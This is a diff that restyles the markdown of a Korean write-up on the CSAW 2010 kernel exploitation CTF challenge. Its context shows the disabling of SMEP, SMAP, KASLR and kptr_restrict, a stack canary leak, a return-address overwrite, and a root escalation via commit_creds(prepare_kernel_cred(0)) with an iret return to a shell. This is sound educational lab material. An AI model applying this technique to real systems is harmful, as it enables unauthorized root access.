@@ -36,14 +36,14 @@ void payload(void)
 
 ## Set environment
 
-리눅스 버전
+**리눅스 버전**
 
 ```bash
 bs@bs-virtual-machine:~$ uname -a
 Linux bs-virtual-machine 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:27 UTC 2016 i686 i686 i686 GNU/Linux
 ```
 
-저장소 정보 저장
+**저장소 정보 저장**
 
 - sudo vi /etc/apt/sources.list.d/ddebs.list
 
@@ -76,7 +76,7 @@ bs@bs-virtual-machine:~$ cat /proc/cpuinfo | grep flags
 flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss nx pdpe1gb rdtscp lm constant_tscarch_perfmon xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avxf16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec
 ```
 
-"/etc/default/grub" 파일의 "GRUB_CMDLINE_LINUX_DEFAULT" 영역에 "nosmep, nosmap, nokaslr" 추가한다.
+`/etc/default/grub` 파일의 `GRUB_CMDLINE_LINUX_DEFAULT` 영역에 `nosmep`, `nosmap`, `nokaslr` 추가한다.
 
 ```
 GRUB_DEFAULT=0
@@ -88,7 +88,7 @@ GRUB_CMDLINE_LINUX_DEFAULT="quiet splash nokaslr nosmep nosmap"
 GRUB_CMDLINE_LINUX=""
 ```
 
-"sudo update-grub" 명령어 실행 후 재부팅한다.
+`sudo update-grub` 명령어 실행 후 재부팅한다.
 
 ```
 bs@bs-virtual-machine:~$ sudo update-grub
@@ -108,7 +108,7 @@ bs@bs-virtual-machine:~$ sudo reboot
 
 ## Disable KADR
 
-KADR 비활성화
+**KADR 비활성화**
 
 ```
 bs@bs-virtual-machine:~$ sudo sysctl -w kernel.kptr_restrict=0
@@ -117,7 +117,7 @@ kernel.kptr_restrict = 0
 
 ## Proof of concept
 
-CASW 2010 Kernel Exploit
+**CASW 2010 Kernel Exploit**
 
 - [https://jon.oberheide.org/files/csaw.c](https://jon.oberheide.org/files/csaw.c)
 - [https://github.com/0x3f97/pwn/tree/master/kernel/csaw-ctf-2010-kernel-exploitation-challenge](https://github.com/0x3f97/pwn/tree/master/kernel/csaw-ctf-2010-kernel-exploitation-challenge)
@@ -306,14 +306,14 @@ clean:
     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 
-make 후 insmod를 통해 모듈 추가 및 666으로 권한을 변경한다.
+make 후 `insmod`를 통해 모듈 추가 및 666으로 권한을 변경한다.
 
 ```
 bs@bs-virtual-machine:~/pwn$ ls -al /dev/chardev0 
 crw-rw-rw- 1 root root 247, 0  6월 11 23:07 /dev/chardev0
 ```
 
-chardev0 장치에서 read 후 buf로 가져와 출력하도록 코드를 작성한다.
+`chardev0` 장치에서 `read()` 후 `buf`로 가져와 출력하도록 코드를 작성한다.
 
 ```c
 #include <stdio.h>
@@ -345,7 +345,7 @@ bs@bs-virtual-machine:~/pwn$ ./exploit
 Welcome to the CSAW CTF challenge. Best of luck!
 ```
 
-chardev_read 주소를 확인한다.
+`chardev_read` 주소를 확인한다.
 
 ```
 bs@bs-virtual-machine:~/pwn$ cat /proc/kallsyms | grep chardev
@@ -367,7 +367,7 @@ f9d3d260 t init_module  [chardev]
 
 ### Leak Canary
 
-canary와 data의 거리차이를 계산(0x40)한다.
+canary와 `data`의 거리차이를 계산(0x40)한다.
 
 ```
 [----------------------------------registers-----------------------------------]
@@ -458,7 +458,7 @@ canary: 0xff37b628
 
 ## Overflow canary
 
-64byte 바로 뒤 canary가 존재한다.
+64 byte 바로 뒤 canary가 존재한다.
 
 ```
 gdb-peda$ x/24wx 0xf61c1ef4
@@ -517,7 +517,7 @@ gdb-peda$ x/24wx 0xf399def4
 0xf399df44: 0x42424242  0xc11ae95f <- ret   0xf399df90  0xecc3fcc0
 ```
 
-return address를 "CCCC"로 변조할 경우 다음과 같이 출력된다.
+return address를 `CCCC`로 변조할 경우 다음과 같이 출력된다.
 
 ```
 bs@bs-virtual-machine:~/pwn$ ./exploit 
@@ -538,13 +538,13 @@ bs@bs-virtual-machine:~/pwn$ dmesg | tail
 
 ### Exploit plan
 
-1. prepare_kernel_cred() 함수의 인자 값으로 ’0’을 전달해 root의 credentials 준비
-2. commit_creds() 함수의 인자 값으로 prepare_kernel_cred() 함수가 리턴한 값 전달
-3. system() 함수를 이용하여 "/bin/sh" 실행
+1. `prepare_kernel_cred()` 함수의 인자 값으로 `0`을 전달해 root의 credentials 준비
+2. `commit_creds()` 함수의 인자 값으로 `prepare_kernel_cred()` 함수가 리턴한 값 전달
+3. `system()` 함수를 이용하여 "/bin/sh" 실행
 
 ### Find address
 
-prepare_kernel_cred, commit_creds 주소 얻어온 후 return address 변조한다.
+`prepare_kernel_cred`, `commit_creds` 주소 얻어온 후 return address 변조한다.
 
 ```c
 // gcc -static test.c -o test
@@ -633,9 +633,9 @@ canary: 0xf58bffe6
 Segmentation fault (core dumped)
 ```
 
-iret(iretq with 64-bit) 명령어를 이용해 해결이 가능하다.iret 명령어는 인터럽트로 중단된 프로그램 또는 프로시저로 프로그램 제어를 반환하는 명령어이다. 즉, iret 명령어가 실행되면, PC 값을 복원하여 이전 실행 위치로 복원된다.
+`iret(iretq with 64-bit)` 명령어를 이용해 해결이 가능하다. `iret` 명령어는 인터럽트로 중단된 프로그램 또는 프로시저로 프로그램 제어를 반환하는 명령어이다. 즉, `iret` 명령어가 실행되면, pc 값을 복원하여 이전 실행 위치로 복원된다.
 
-iret 명령을 이용하기 위해 특정 stack layout이 필요하다.
+`iret` 명령을 이용하기 위해 특정 stack layout이 필요하다.
 
 |32 bit|64 bit|
 |:---:|:---:|
@@ -645,7 +645,7 @@ iret 명령을 이용하기 위해 특정 stack layout이 필요하다.
 |ESP|RSP|
 |SS|SS|
 
-iret 명령어에 필요한 stack layout 형태 구조체 생성한다. 어셈블리 코드를 이용해 stack layout에 필요한 레지스터 값을 tf 구조체에 저장하는 함수 구현한다. EIP 영역에는 shell을 실행하는 함수의 주소를 저장한다. ESP 레지스터에 tf 구조체의 주소를 저장하고 iret 명령어 호출한다.
+`iret` 명령어에 필요한 stack layout 형태 구조체 생성한다. 어셈블리 코드를 이용해 stack layout에 필요한 레지스터 값을 tf 구조체에 저장하는 함수 구현한다. `EIP` 영역에는 shell을 실행하는 함수의 주소를 저장한다. ESP 레지스터에 tf 구조체의 주소를 저장하고 `iret` 명령어 호출한다.
 
 ```c
 struct trap_frame {
@@ -674,7 +674,7 @@ void payload(void)
 ...
 ```
 
-payload() 함수에서 권한 상승 후 esp 레지스터에 tf 구조체의 시작 주소를 저장하고, iret 명령어를 호출한다.
+`payload()` 함수에서 권한 상승 후 `esp` 레지스터에 `tf` 구조체의 시작 주소를 저장하고, `iret` 명령어를 호출한다.
 
 ```
 => 0x8048ea2:   push   ebp
@@ -694,7 +694,7 @@ payload() 함수에서 권한 상승 후 esp 레지스터에 tf 구조체의 시
 0x8048ec9:  ret  
 ```
 
-tf 구조체의 시작 주소 저장, iret 전 레지스터
+**`tf` 구조체의 시작 주소 저장, `iret` 전 레지스터**
 
 ```
 (gdb) x/24wx $esp
@@ -720,7 +720,7 @@ fs             0xd8 216
 gs             0xe0 224
 ```
 
-iret 후 레지스터
+**`iret` 후 레지스터**
 
 ```
 (gdb) info r
